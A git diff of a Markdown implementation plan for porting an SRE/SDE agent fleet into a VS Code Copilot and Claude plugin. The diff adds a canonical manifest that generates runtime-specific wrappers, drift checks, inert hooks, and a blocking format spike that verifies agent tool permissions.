@@ -4,9 +4,9 @@
 
 **Goal:** Rebuild this repo's fleet as a VS Code Copilot agent plugin — 5 agents / 26 skills — from first principles, fixing the audit's six Tier-2 bugs during the port and never porting them as-is.
 
-**Architecture:** Seven phases, content-first (Section 7's ordering rule): agents → skills → observability skills → machinery → distribution → pilot → rollout. Each phase is its own branch off `main`, opened and closed with the Section 0 run protocol; a phase is not done until audits A–C are green (D runs over the content-complete fleet and again at pilot). Probes and tests are written first and failing, scoped to the artifact under change: the Tier-2 regression test lands before any content is ported, and the Section-5d link checker lands before the first skill port.
+**Architecture:** Seven phases, with a blocking cross-runtime preflight before the first fleet agent: one canonical fleet manifest + canonical bodies generate distinct Copilot and Claude wrappers, then content proceeds agents → skills → observability skills → machinery → distribution → pilot → rollout. Each phase is its own branch off `main`, opened and closed with the Section 0 run protocol; a phase is not done until audits A–C are green (D runs over the content-complete fleet and again at pilot). Probes and tests are written first and failing, scoped to the artifact under change.
 
-**Tech Stack:** Markdown agent/skill definitions (`.agent.md`, `SKILL.md`); Python 3 stdlib scripts (`scripts/gate_a.py` and its steps); PowerShell + POSIX sh (`setup.ps1`/`setup.sh`); GitHub Actions; VS Code Copilot chat (agent-plugin layer).
+**Tech Stack:** canonical JSON + Markdown bodies; generated Copilot `.agent.md` and Claude `.md` wrappers; shared `SKILL.md` bundles; Python 3 stdlib scripts (`scripts/generate_fleet.py`, `scripts/gate_a.py` and its steps); PowerShell + POSIX sh (`setup.ps1`/`setup.sh`); GitHub Actions; VS Code Copilot chat and Claude Code as separately validated runtimes.
 
 **Design spec:** `docs/superpowers/specs/2026-07-13-copilot-fleet-redesign-design.md` (Status: approved). Evidence base for every content fix: `docs/AUDIT-2026-07-12.md`. Harvest source: `C:\Users\hawkins\sde-agents` (github.com/latent-sre/sde-agents — one-way copies; this repo then owns them).
 
@@ -34,7 +34,8 @@
 - **Python is `py -3` on this machine, NOT `python3`** (`python3` is the Microsoft Store stub). Every gate goes through `scripts/gate_a.py`, which re-invokes sub-steps under `sys.executable` — do not hardcode any interpreter name into a new script's docs or CI beyond what Task 1 shows.
 - **Verbatim-move discipline.** Ported prose relocates unchanged — the plan names the source file and section, it never re-types the prose (re-typing invites silent transcription drift). **The single stated exception (spec Section 5d): every pointer to a bundled file (`references/`, `assets/`, `scripts/` inside a skill) is rewritten to a relative Markdown link during the move** — `[forms](./references/forms.md)`, never `` `references/forms.md` ``. Predicate tables keep their shape; the right-hand cell becomes a link. Every bundled file must be linked from the body (unlinked = never loads = delete it). Each port task lists its exact pointer-rewrite worklist; `scripts/check_links.py` (Task 9) enforces it mechanically from the first port onward.
 - **The six Tier-2 bugs are fixed during the port, never ported as-is** (audit §2.1–2.6): blue-green name rotation · WQL `by`-clause deletion · SPL `timechart` bucketing · bare `cf auth` (no argv) · `error_budget.py` severity + window-pair binding · Grafana Enterprise-licence facts. `scripts/test_no_regressions.py` (Task 2) makes porting any of them a Gate-A failure.
-- **One manifest location: `.claude-plugin/plugin.json`. No second `plugin.json` at the repo root** — "no second source of truth."
+- **One source of truth, two generated projections.** Authors edit only `canonical/fleet.json` and `canonical/agents/*.md`. `scripts/generate_fleet.py` emits root `plugin.json` + `generated/copilot/agents/*.agent.md` and `.claude-plugin/plugin.json` + `generated/claude/agents/*.md`; `--check` rejects drift. Both manifests share generated name/version. Root Copilot `agents` points at the Copilot agent directory; Claude `agents` enumerates explicit Claude files.
+- **Runtime boundaries are structural.** Shared skills/references stay under `skills/`, but their exact names and bundled-file inventory (`references/`, `assets/`, and `scripts/`) live in `canonical/fleet.json`; unexpected runtime-visible skill directories or bundled files fail `--check`. Agent entries name their skill dependencies. Root `hooks.json` is Copilot's auto-discovered hook; `hooks/hooks.json` is Claude's. Neither manifest references a hook file. Every agent is explicitly named. A nonempty Copilot `agents:` list automatically adds the `agent` tool; Claude delegation maps to `Agent(target)` and records the nested target-list degradation; handoffs emit only for Copilot; model fields map per runtime.
 - **The `tools:` vocabulary is UNVERIFIED and is the primary safety control.** Task 3's four-assertion blocking check runs on the first real agent (`reviewer`) in real VS Code Copilot **before the other four agents are authored**. Its STOP conditions are non-negotiable; on any failure, amend spec Section 5 before proceeding.
 - **Names are kebab-case** (silent-load-failure class). **Descriptions carry verbatim user phrasings** (`Triggers: "..."`) plus boundary clauses, **≤ 150 tokens each** (Section 8 bar). The one measured-good model is old `agent-authoring`'s description (3/3 baseline, twice).
 - **Evidence labeling is uniform doctrine**: `[verified]` / `[sourced]` / `[unverified]`, using the sde-agents canonical stems (they become validator-v2 checks in Task 37). Gate C rule: **every stack-specific command, query, or API field in a ported or new skill is either executed against the real system and labeled `[verified]`, or labeled `[unverified]`.** An unlabeled claim is a review finding.
@@ -50,7 +51,7 @@
 |---|---|---|
 | Task 20 (ci-actions) | Do any live Bamboo migrations remain? | **No** → Bamboo content deleted (git-recoverable) |
 | Task 44 (CODEOWNERS/README) | Named fleet maintainer (spec Section 9: "OWNER DECISION, not a builder guess") | **Blocks the task** — no default |
-| Task 3 / Task 42 | If org gates fail (plugins policy-blocked), fallback channel is the ship vehicle | Fallback channel (layout is identical) |
+| Pre-Task-3 format gate / Task 42 | If org gates fail (plugins policy-blocked), fallback channel is the ship vehicle | Fallback consumes `generated/copilot/agents/`; Claude remains a separately tested projection |
 
 ## On "paste the section verbatim" steps and new stack content
 
@@ -61,13 +62,19 @@ This plan does not reproduce ported prose inside itself: for a move, "relocate `
 **Created (new fleet):**
 
 ```
-.claude-plugin/plugin.json            # the single manifest (Task 1)
+canonical/fleet.json                  # only metadata/capability/delegation authoring source
+canonical/agents/{reviewer,sde,sre,observer,scribe}.md    # only agent-body authoring sources
+generated/copilot/agents/*.agent.md   # generated; never edit
+generated/claude/agents/*.md          # generated; never edit
+plugin.json                           # generated Copilot manifest; agents = Copilot directory
+.claude-plugin/plugin.json            # generated Claude manifest; explicit agent-file list
 .claude-plugin/marketplace.json       # repo is both marketplace and plugin (Task 1)
 .mcp.json                             # empty until the Grafana MCP decision (Task 1, Task 30)
-agents/{reviewer,sde,sre,observer,scribe}.agent.md        # Tasks 3–7
-skills/<26 skills>/SKILL.md (+ references/ assets/ scripts/)  # Tasks 10–32
+skills/<26 skills>/SKILL.md (+ references/ assets/ scripts/)  # shared by both runtimes
 commands/adr.md (embeds the ADR template)                 # Task 24
-hooks/hooks.json                      # Task 38 (Copilot allowlist hook wiring)
+hooks.json                            # Copilot auto-discovered allowlist hook projection
+hooks/hooks.json                      # Claude auto-discovered hook projection
+scripts/generate_fleet.py             # deterministic projections + --check
 scripts/test_no_regressions.py        # Task 2  (Gate B, mechanized)
 scripts/check_links.py                # Task 9  (Section 5d, mechanized early)
 scripts/allowlist_guard.py            # Task 38 (replaces readonly-guard.py)
@@ -78,7 +85,7 @@ legacy/claude-fleet/{agents,skills,AGENTS.md,CLAUDE.md,README.md}  # Task 1 (fro
 evals/routing/*.json                  # Task 35 (cluster files, sde-agents format)
 ```
 
-**Modified:** `scripts/gate_a.py` (new steps; `FLEET_ROOT` for legacy steps), `scripts/validate_fleet.py` (one-line Task 1 fix; replaced wholesale by v2 in Task 37), `evals/` (rewritten per unit in Tasks 34–35), `.github/workflows/validate.yml` (Task 40), `README.md`, `AGENTS.md`, `CLAUDE.md`, `docs/RESEARCH.md` (Tasks 45–46).
+**Modified:** `scripts/gate_a.py` (new steps; `FLEET_ROOT` for legacy steps), `scripts/validate_fleet.py` (one-line Task 1 fix; replaced wholesale by v2 in Task 37), `evals/` (rewritten per unit in Tasks 34–35), `.github/workflows/validate.yml` (Task 40), `README.md`, `AGENTS.md`, `CLAUDE.md`, `docs/RESEARCH.md` (Tasks 45–46). Any later reference to `agents/*.agent.md` means a generated Copilot output; authors always edit the matching canonical body/entry and regenerate.
 
 **Deleted (Task 40, after replacements are green):** `scripts/readonly-guard.py`, `scripts/readonly-guard-hook.sh`, `scripts/ralph-loop.sh`, `scripts/test_readonly_guard.py` (rewritten as `test_allowlist_guard.py`), the two `__pycache__` dirs inside old skill bundles (never ported: `slo-error-budget/scripts/__pycache__/`, `ops-cli/assets/__pycache__/`).
 
@@ -88,10 +95,10 @@ evals/routing/*.json                  # Task 35 (cluster files, sde-agents forma
 
 # PHASE 1 — THE AGENTS (branch `phase-1-agents`)
 
-### Task 1: Run-protocol open, scaffold, legacy freeze, and keeping Gate A alive
+### Task 1: Run-protocol open, dual-projection scaffold, legacy freeze, and keeping Gate A alive
 
 **Files:**
-- Create: `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json`, `.mcp.json`, `agents/.gitkeep`, `skills/.gitkeep`, `commands/.gitkeep`, `hooks/.gitkeep`
+- Create: `canonical/fleet.json`, `canonical/agents/.gitkeep`, `scripts/generate_fleet.py`, `scripts/test_generate_fleet.py`, `generated/{copilot,claude}/agents/.gitkeep`, generated root `plugin.json`, generated `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json`, `.mcp.json`, `skills/.gitkeep`, `commands/.gitkeep`, root `hooks.json`, `hooks/hooks.json`
 - Move: `.claude/agents/` → `legacy/claude-fleet/agents/`; `.claude/skills/` → `legacy/claude-fleet/skills/`
 - Copy: `AGENTS.md`, `CLAUDE.md`, `README.md` → `legacy/claude-fleet/`
 - Modify: `scripts/validate_fleet.py:439` (one line), `scripts/gate_a.py` (STEPS env support)
@@ -113,21 +120,31 @@ git add legacy/claude-fleet
 
 Not cosmetic: VS Code discovers skills from `.claude/skills/` in any open workspace — leaving the old fleet in place double-loads 37 old + 26 new skills during the exact phases used to judge the redesign. `AGENTS.md`/`CLAUDE.md` sit at the repo root, so the `git mv` misses them; they carry content the new bodies must absorb (stack profile, roster/routing, read-only doctrine, egress census, gate layering, shared conventions) — **Phases 1–3 mine `legacy/claude-fleet/AGENTS.md` while authoring; the live `AGENTS.md` rewrite is Task 46, last.** `README.md` is copied too (one file beyond the spec's list) because the frozen validator's roster/count checks read it — without it, Step 4's `FLEET_ROOT` run fails on a missing doc, not on real drift.
 
-- [ ] **Step 3: Create the plugin scaffold** — `.claude-plugin/plugin.json`:
+- [ ] **Step 3: Create the canonical + generated plugin scaffold.** Adapt the accepted generator architecture from `spikes/copilot-claude-format/`; do not hand-maintain either manifest. `canonical/fleet.json` initially carries plugin metadata and an empty `agents` list:
 
 ```json
 {
-  "name": "sre-agents",
-  "displayName": "SRE Agents",
-  "description": "SRE + SDE fleet for VS Code Copilot — 5 agents, 26 skills, incident-to-code.",
-  "version": "0.1.0",
-  "author": { "name": "latent-sre", "url": "https://github.com/latent-sre" },
-  "homepage": "https://github.com/latent-sre/sre-agents",
-  "repository": "https://github.com/latent-sre/sre-agents",
-  "license": "MIT",
-  "keywords": ["agents", "skills", "sre", "copilot", "pcf", "observability"]
+  "schema_version": 1,
+  "plugin": {
+    "name": "sre-agents",
+    "displayName": "SRE Agents",
+    "description": "SRE + SDE fleet — 5 agents, 26 skills, incident-to-code.",
+    "version": "0.1.0",
+    "author": { "name": "latent-sre", "url": "https://github.com/latent-sre" },
+    "homepage": "https://github.com/latent-sre/sre-agents",
+    "repository": "https://github.com/latent-sre/sre-agents",
+    "license": "MIT",
+    "keywords": ["agents", "skills", "sre", "copilot", "claude", "pcf", "observability"]
+  },
+  "models": { "copilot": [], "claude": null },
+  "skills": [],
+  "agents": []
 }
 ```
+
+`scripts/generate_fleet.py --write` emits only fields documented for each runtime; it must not blindly copy canonical metadata into both schemas. While the canonical agent list is empty, both manifests omit `agents`. Once the first agent exists, root `plugin.json` uses `"agents": "./generated/copilot/agents/"`, while `.claude-plugin/plugin.json` uses an explicit generated-Claude agent-file list. Both point to shared `./skills/`, carry identical generated `name`/`version`, and contain **no hook path**. The production generator permits the scaffold's zero-agent/zero-skill state, then enforces exact agent, canonical-body, skill, and bundled-file parity as entries appear. The generator also owns both wrapper directories and both runtime-specific hook projections. `--check` compares exact bytes and rejects missing, stale, or unexpected generated files. Port the spike's pure/negative projection tests into `scripts/test_generate_fleet.py`, including unknown keys, orphan/misnamed canonical bodies, manifest path shapes, hook non-duplication, and stale/unexpected outputs. Add both `("Generated fleet contract", ["-m", "unittest", "discover", "-s", "scripts", "-p", "test_generate_fleet.py"], None)` and `("Generated fleet is current", ["scripts/generate_fleet.py", "--check"], None)` to Gate A now.
+
+Generate minimal inert root `hooks.json` (Copilot format) and `hooks/hooks.json` (Claude format) only so auto-discovery paths exist; neither may write, execute repo code, or access the network. They are byte-for-byte `--check` outputs, not hand-maintained files. The nonempty spike gate below proves both formats before Task 3; Task 38 replaces these inert hooks with runtime-specific guard projections.
 
 `.claude-plugin/marketplace.json` (the `github` + `ref` source is a security decision — a `"./"` source ships unreviewed `main` to the whole team within 24h; see spec Section 1):
 
@@ -146,7 +163,7 @@ Not cosmetic: VS Code discovers skills from `.claude/skills/` in any open worksp
 }
 ```
 
-`.mcp.json`: `{ "mcpServers": {} }` (the Grafana MCP server is evaluated in Task 30 — existence/fit unverified; do not pre-wire it). Create empty `agents/`, `skills/`, `commands/`, `hooks/` with `.gitkeep` files.
+`.mcp.json`: `{ "mcpServers": {} }` (the Grafana MCP server is evaluated in Task 30 — existence/fit unverified; do not pre-wire it). Create empty canonical/generated agent directories and shared `skills/`/`commands/` directories with `.gitkeep` files as needed.
 
 - [ ] **Step 4: Keep Gate A meaningful (the trap the spec's review caught).** The old validator cannot validate `.agent.md` Copilot frontmatter, and its layout probe would otherwise resolve to the new near-empty root dirs. Until validator v2 (Task 34), Gate A's fleet-structure step validates the **frozen legacy tree** — a tripwire against accidental legacy edits — via the `FLEET_ROOT` env var the validator already honors (`validate_fleet.py:58`).
 
@@ -170,6 +187,10 @@ Not cosmetic: VS Code discovers skills from `.claude/skills/` in any open worksp
        ["scripts/validate_fleet.py"], LEGACY),
       ("Validator's own tests",
        ["-m", "unittest", "discover", "-s", "scripts", "-p", "test_validate_fleet.py"], None),
+      ("Generated fleet is current",
+       ["scripts/generate_fleet.py", "--check"], None),
+      ("Generated fleet contract",
+       ["-m", "unittest", "discover", "-s", "scripts", "-p", "test_generate_fleet.py"], None),
       ("Read-only guard",
        ["scripts/test_readonly_guard.py"], None),
       ("Eval graders",
@@ -192,26 +213,26 @@ Not cosmetic: VS Code discovers skills from `.claude/skills/` in any open worksp
 
   (c) `evals/run_evals.py` — its `target_exists()` probes layouts from the repo root (lines ~70–71). Make that root `os.environ.get("FLEET_ROOT")`-aware, mirroring `validate_fleet.py:58`, so the `--validate` step above resolves legacy targets. If `test_validate_fleet.py` fixtures assume the old default, run them and fix only what actually breaks — surgically.
 
-- [ ] **Step 5: Run Gate A — all seven steps must pass**
+- [ ] **Step 5: Run Gate A — every configured step must pass**
 
 Run: `py -3 scripts/gate_a.py`
 Expected: `VALIDATION: PASS`-style green on all steps, with "Fleet structure (legacy, frozen)" validating 37 skills / 9 agents at their new location. If the roster-docs check still complains, the Step-4(a) edit missed the resolved-layout variable — fix there, not by deleting the check.
 
-- [ ] **Step 6: Stand up the fallback channel on this machine** (Task 3's blocking check runs in VS Code Copilot — `--plugin-dir .` loads Claude Code, which cannot evaluate `.agent.md`). In VS Code `settings.json` (JSONC — edit by hand, do not script it here) add:
+- [ ] **Step 6: Prepare the fallback path on this machine** (the nonempty format gate runs it separately from native plugin discovery). In VS Code `settings.json` (JSONC — edit by hand, do not script it here) add:
 
 ```jsonc
-"chat.agentFilesLocations": { "F:\\repos\\sre-agents\\agents": true },
+"chat.agentFilesLocations": { "F:\\repos\\sre-agents\\generated\\copilot\\agents": true },
 "chat.agentSkillsLocations": { "F:\\repos\\sre-agents\\skills": true }
 ```
 
 Both settings are GA, no admin needed. Record `[verified]`/`[unverified]` for whether each key was accepted (they are the fallback channel's load-bearing pair).
 
-- [ ] **Step 6b: Claude-proxy plugin smoke test [grafted from PR #61]** — `claude --plugin-dir . -p "Reply with exactly: PLUGIN_OK"` → expect `PLUGIN_OK`, no plugin-load error. Proves `.claude-plugin/plugin.json` parses and the repo loads as a plugin with an empty fleet. Without it, a malformed manifest surfaces three phases later, at the moment Gate D depends on the proxy.
+- [ ] **Step 6b: Empty Claude-projection smoke test** — `claude plugin validate . --strict`, then `claude --plugin-dir . -p "Reply with exactly: PLUGIN_OK"` → expect strict validation and `PLUGIN_OK`, no plugin-load error. This proves only the Claude projection. It is not evidence for native Copilot or fallback discovery; the nonempty gate below owns those rows.
 
 - [ ] **Step 7: Commit**
 
 ```bash
-git add .claude-plugin .mcp.json agents skills commands hooks legacy scripts
+git add canonical generated plugin.json .claude-plugin .mcp.json skills commands hooks.json hooks legacy scripts
 git commit -m "phase 1: freeze the Claude fleet into legacy/, scaffold the plugin, keep Gate A green
 
 git mv .claude/{agents,skills} -> legacy/claude-fleet/ so VS Code cannot
@@ -220,8 +241,9 @@ beside it because the mv misses repo-root files and their content must be
 absorbed, not lost. Gate A's fleet-structure and eval-parse steps now pin
 FLEET_ROOT=legacy/claude-fleet (the old validator cannot read .agent.md,
 and an empty new fleet is not a meaningful target); validate_fleet.py's
-last hardcoded .claude path made layout-relative. One manifest location:
-.claude-plugin/plugin.json, no root duplicate."
+last hardcoded .claude path made layout-relative. One canonical manifest
+now generates drift-checked Copilot and Claude projections; hooks remain
+runtime-specific auto-discovery files, not manifest entries."
 ```
 
 ---
@@ -246,7 +268,7 @@ The audit's Tier-2 bugs are live on `main`, and this migration's core operation 
 
 Two halves, both required:
   1. FORBIDDEN: each known-bad string must appear NOWHERE under the new fleet trees
-     (skills/, agents/, commands/). Detection strings chosen from docs/AUDIT-2026-07-12.md
+     (skills/, canonical/, generated/, commands/). Detection strings chosen from docs/AUDIT-2026-07-12.md
      against the live buggy files -- distinctive enough not to false-positive on fixed content
      (e.g. `cf auth` bare is the FIX; only the argv form is forbidden).
   2. SELF-ARM: each pattern must still match its known-bad legacy copy
@@ -260,7 +282,7 @@ import os
 import sys
 
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-NEW_FLEET_DIRS = ("skills", "agents", "commands")
+NEW_FLEET_DIRS = ("skills", "canonical", "generated", "commands")
 LEGACY = os.path.join("legacy", "claude-fleet")
 
 # (bug id, forbidden string, legacy file that self-arms it)
@@ -388,7 +410,7 @@ if __name__ == "__main__":
      ["scripts/test_no_regressions.py"], None),
 ```
 
-Run: `py -3 scripts/gate_a.py` — expected: all 8 steps green.
+Run: `py -3 scripts/gate_a.py` — expected: every configured step green.
 
 - [ ] **Step 4: Commit**
 
@@ -403,6 +425,18 @@ permanent, unskippable."
 
 ---
 
+### Task 2b: BLOCKING format-boundary spike — three runtimes, no proxy
+
+**Files:** `spikes/copilot-claude-format/` only for the spike evidence; production generator inputs remain the Task-1 paths. The spike must be nonempty: coordinator agent, delegated terminal worker, shared skill with an explicit relative reference, and inert hook projections.
+
+- [ ] **Step 1: Structural gate.** Run the spike's unit suite and `py -3 spikes/copilot-claude-format/scripts/generate.py --check`. Assert: one canonical manifest/body set; every wrapper has explicit `name`; root `plugin.json` points to the Copilot agent **directory**; `.claude-plugin/plugin.json` lists explicit Claude files; manifest name/version match; bodies and the exact shared skill/reference inventory do not drift; hooks are root `hooks.json` versus `hooks/hooks.json` and are absent from both manifests; any Copilot delegates list adds `agent`; Claude emits `Agent(target)`; handoffs are Copilot-only. The spike deliberately omits `model` so both runtimes inherit the selected session model; production model-shape mapping is separately generator-tested and first-runtime-probed in Task 3, then availability-gated in Phase 5. Record both that noncoverage and Claude's nested-delegator target-list degradation in `compatibility.json` rather than claiming exact enforcement.
+- [ ] **Step 2: Native Copilot plugin evidence.** Register the spike root through `chat.pluginLocations`, reload VS Code, select the coordinator, delegate to the worker, require the reference marker, and observe the inert root-hook marker. Ask the terminal worker to execute and delegate; both must be unavailable. Record VS Code + Copilot versions and transcript/Diagnostics evidence. **A fallback or Claude pass cannot close this row.**
+- [ ] **Step 3: Copilot fallback evidence.** Disable the spike plugin registration for this run; point `chat.agentFilesLocations` to `spikes/copilot-claude-format/generated/copilot/agents/` and `chat.agentSkillsLocations` to its `skills/`. Repeat agent/delegation/reference/terminal assertions and exercise the documented fallback hook registration separately. Record evidence. **A native-plugin or Claude pass cannot close this row.**
+- [ ] **Step 4: Claude evidence.** Run `claude plugin validate spikes/copilot-claude-format --strict`, then a clean-room CLI session selecting the generated coordinator. Require one `Agent(worker)` delegation, shared skill/reference marker, Claude hook marker, and no `Agent` tool on the terminal worker. Record commands + stream events. This validates Claude only.
+- [ ] **Step 5: STOP gate.** All three rows and generator drift check must pass before Task 3. If one artifact shape cannot satisfy a runtime, fix that projection/generator—never fork canonical bodies or edit generated wrappers. Copy any proven generator correction into `scripts/generate_fleet.py`, regenerate the empty production scaffold, and run both `--check` commands. No fleet agent may be created while any row is `[unverified]` or failed.
+
+---
+
 **The uniform doctrine layer (spec Section 3 — woven into every agent body, Tasks 3–7; exact text, deliberately duplicated per body — dedup is explicitly deferred, the sde-agents precedent):**
 
 1. **Evidence triad** (canonical stems — validator v2 enforces them verbatim): *"Label load-bearing claims anywhere in the packet: **[verified]** (you ran or observed it), **[sourced]** (cited to file:line, URL, or query), or **[unverified]** (assumption or couldn't check). Never let an [unverified] claim read as fact."*
@@ -412,22 +446,24 @@ permanent, unskippable."
 5. **The stack-profile line**: *"Before recommending a runtime, tool, or infrastructure change, load `stack-profile`."*
 6. **The handoff packet + taint doctrine** (Task 8 Step 1 weaves it — the dissolved `handoff-protocol`'s surviving remains).
 
-**Cut-disposition convention for the agent tasks (3–8) [grafted from PR #61].** These tasks mine their sources *selectively*, and no mechanical gate can see prose dropped from an agent body. So the blanket disposition is: **any source section the assembly list does not name is a deliberate cut — list the cut headings in the commit body.** (For Task 3, that is security-reviewer's `## Method`/`## Handoffs` remainders.) SPC-1's after-side for these tasks is simply `cat agents/<name>.agent.md`.
+**Cut-disposition convention for the agent tasks (3–8) [grafted from PR #61].** These tasks mine their sources *selectively*, and no mechanical gate can see prose dropped from an agent body. So the blanket disposition is: **any source section the assembly list does not name is a deliberate cut — list the cut headings in the commit body.** (For Task 3, that is security-reviewer's `## Method`/`## Handoffs` remainders.) SPC-1's after-side is `cat canonical/agents/<name>.md` followed by `py -3 scripts/generate_fleet.py --check`; generated wrappers are evidence, never edit targets.
 
-**The stale-name rule applies to Phase 1's verbatim moves too** (Task 9's checker scans `agents/` retroactively — a hit there in Phase 2 is a Phase-1 leftover; the goal is zero). Measured repoint worklist for the moves Tasks 3–8 order: `incident-severity`→`incident-command` and `blameless-postmortem`→`postmortem` inside legacy `sre-engineer.md` `## Method` (lines 65, 76 → Task 5); `debug-rca`→`root-cause` inside `test-engineer.md` `## Per-language testing` (line 50 → Task 4); `runbook-template`→`runbook`, `blameless-postmortem`→`postmortem`, `incident-severity`→`incident-command`, `sre-engineer`→`sre` across `runbook-author.md` lines 45, 50, 67, 73–74, 84 (→ Task 7); `sre-engineer`→`sre` in `security-reviewer.md`'s compromise bullets (lines 87, 91 → Task 3); `sre-engineer`→`sre` in `handoff-protocol/SKILL.md` `## Rules` line 35 (→ the Task 8 weave). A rename to the Disposition-ledger target is part of the move, not prose improvement.
+**No dangling targets during incremental authoring.** The frontmatter blocks in Tasks 3–7 show the **final Phase-1 Copilot projection**. The canonical validator rejects a delegation or handoff target that does not exist yet, so each task adds only edges whose targets are already present. Task 7, after `scribe` exists, activates every deferred edge and asserts that the regenerated final projections match the blocks below. The generator must never silently omit a canonical edge or accept a dangling one.
 
-### Task 3: Author `reviewer` first — and run the four-assertion blocking check
+**The stale-name rule applies to Phase 1's verbatim moves too** (Task 9's checker scans canonical agent bodies and shared skills retroactively; a hit there in Phase 2 is a Phase-1 leftover). Measured repoint worklist for the moves Tasks 3–8 order: `incident-severity`→`incident-command` and `blameless-postmortem`→`postmortem` inside legacy `sre-engineer.md` `## Method` (lines 65, 76 → Task 5); `debug-rca`→`root-cause` inside `test-engineer.md` `## Per-language testing` (line 50 → Task 4); `runbook-template`→`runbook`, `blameless-postmortem`→`postmortem`, `incident-severity`→`incident-command`, `sre-engineer`→`sre` across `runbook-author.md` lines 45, 50, 67, 73–74, 84 (→ Task 7); `sre-engineer`→`sre` in `security-reviewer.md`'s compromise bullets (lines 87, 91 → Task 3); `sre-engineer`→`sre` in `handoff-protocol/SKILL.md` `## Rules` line 35 (→ the Task 8 weave). A rename to the Disposition-ledger target is part of the move, not prose improvement.
 
-The first real agent carries the one platform fact that can invalidate the design: **does `tools:` omission genuinely deny?** Author `reviewer` (`read`, `search` only), load it in **VS Code Copilot** (the fallback channel from Task 1 Step 6 — `--plugin-dir .` loads Claude Code, which cannot evaluate `.agent.md`), and assert four things. "It couldn't run a command" alone is NOT a pass — that is equally consistent with the agent receiving nothing at all.
+### Task 3: Author `reviewer` first — and re-run the production tool-boundary assertions
+
+Task 2b has already proved the format boundary. `reviewer` (`read`, `search` only) is the first production agent and re-runs the same denial assumptions against the real body in native Copilot and fallback; its Claude wrapper is checked separately. "It couldn't run a command" alone is NOT a pass — that is equally consistent with the agent receiving nothing at all.
 
 **Files:**
-- Create: `agents/reviewer.agent.md`
+- Modify: `canonical/fleet.json`, `scripts/test_generate_fleet.py`; Create: `canonical/agents/reviewer.md`; Generate: `generated/copilot/agents/reviewer.agent.md`, `generated/claude/agents/reviewer.md`, both manifests
 - Modify: `docs/superpowers/specs/2026-07-13-copilot-fleet-redesign-design.md` (Section 3 — pin the verified `tools:` vocabulary)
 
 **Interfaces:**
 - Produces: the agent name `reviewer` (consumed by `sde`'s `agents:`/`handoffs:` in Task 4 and by skill descriptions in Phases 2–3 — do not rename); the **verified tools vocabulary** every later agent's frontmatter uses; the verdict on whether `agents:` omission denies (spec's "default deny" assumption).
 
-- [ ] **Step 1: Write `agents/reviewer.agent.md`.** Frontmatter (the alias vocabulary is the spec's working assumption — this task exists to verify it; pin whatever syntax the live VS Code custom-agents doc shows at authoring time and record deviations in Step 4):
+- [ ] **Step 1: Add `reviewer` to `canonical/fleet.json` and write `canonical/agents/reviewer.md`.** The block below is the expected **generated Copilot projection**; do not edit it directly. The Claude projection uses Claude-valid tools/model syntax and omits Copilot handoffs:
 
 ```yaml
 ---
@@ -443,6 +479,8 @@ handoffs:
 
 No `agents:` key — reviewer is terminal and read-only; a read-only reviewer that can spawn a write-capable agent is not read-only ("delegation is not isolation", audit Tier 4).
 
+Extend `scripts/test_generate_fleet.py` before regeneration: assert the canonical Copilot model list projects only to the Copilot wrapper, while Claude receives its single Claude-valid value or omits `model` to inherit; assert neither runtime accepts the other's shape. This is the model-field boundary intentionally omitted from the format spike.
+
 Body assembly (verbatim moves from the pinned sde-agents checkout unless marked NEW/EDITED):
 1. `# Reviewer` title + one NEW intro line: *"Two lenses, one tool scope: every review runs the correctness pass; changes touching auth, input handling, secrets, crypto, dependencies, or PII also run the security lens below."*
 2. **Verbatim move** from `C:/Users/hawkins/sde-agents/agents/code-reviewer.md`: `## Scope the review first` (line 13), `## Evidence gate` (19), `## Review dimensions, in priority order` (23), `## Output format` (33) including `### Worked example (the shape, compressed)` (44), `## Integrity rules` (72) — including the `[caller-flagged]`/`[independent]` labeling + mandatory independent-P0/P1-count rule (line 42) and the prompt-injection rule (line 75).
@@ -450,7 +488,7 @@ Body assembly (verbatim moves from the pinned sde-agents checkout unless marked 
 4. NEW `## Security lens` — **verbatim move** of `## Threat lens (what to hunt)` from `legacy/claude-fleet/agents/security-reviewer.md` (line 27), plus its post-PR-#53 active-compromise routing guardrail (locate in that file's `## Guardrails`/`## Handoffs`; move the compromise bullet verbatim), **plus [grafted from PR #61] that agent's output-contract fields as required fields for security findings** — the fenced contract at `security-reviewer.md:66–75` (severity + CWE/OWASP ref · `Attack path:` · `Impact:` · `Remediation:` · `Confidence: <high|medium|low — exploitable vs theoretical>`) and its anti-cry-wolf method line (62–64): *"Confirm exploitability… if unreachable by an attacker, downgrade it. Don't cry wolf."* Without these, the merged reviewer keeps the threat list but loses the discipline that made the security lane trustworthy.
 5. Doctrine layer (NEW, exact text): the canonical evidence-label sentence — *"Label load-bearing claims anywhere in the packet: **[verified]** (you ran or observed it), **[sourced]** (cited to file:line, URL, or query), or **[unverified]** (assumption or couldn't check). Never let an [unverified] claim read as fact."* — and the stack-profile line every agent carries: *"Before recommending a runtime, tool, or infrastructure change, load `stack-profile`."*
 
-- [ ] **Step 2: Load it in VS Code Copilot** (reload window; agent dropdown should show `reviewer`). If it does not appear, debug discovery (file extension `.agent.md`, `chat.agentFilesLocations`) before touching assertions. If loading fails specifically because the `handoffs:` target `sde` does not exist yet (Task 4), comment the handoffs block out, complete the assertions, restore it in Task 4 — and record whether VS Code validates targets at load; that behavior feeds validator v2's dangling-target check. **File-format contingency, pre-stated [grafted from PR #61]:** agent files are `<name>.agent.md` (VS Code's discovery suffix) **with an explicit `name:` field** so the Claude-plugin channel — which reads `agents/*.md` — sees the same name. If either channel refuses the file, the fallback is renaming to `<name>.md`: a file rename recorded in the spec, not a design change.
+- [ ] **Step 2: Generate and load it in VS Code Copilot** (`py -3 scripts/generate_fleet.py --write`, then `--check`; reload window; agent dropdown should show `reviewer`). If it does not appear, debug the generated Copilot suffix and discovery path before touching assertions. Do not add the final `sde` handoff canonically until Task 4 creates `sde`; the generator rejects dangling targets and never hides them. There is **no rename contingency**: Copilot and Claude deliberately receive different generated suffixes, both with explicit `name`.
 
 - [ ] **Step 3: Run the four assertions, in order, in a real chat with `reviewer`:**
 
@@ -459,14 +497,14 @@ Body assembly (verbatim moves from the pinned sde-agents checkout unless marked 
 | 1 | `Read scripts/gate_a.py in this repo and quote the labels in its STEPS list.` | Quotes real labels | Grants are not landing — vocabulary wrong. **STOP.** |
 | 2 | `Search this repository for the string "test_no_regressions" and report each file and line it appears in.` | Real file:line hits | Same. **STOP.** |
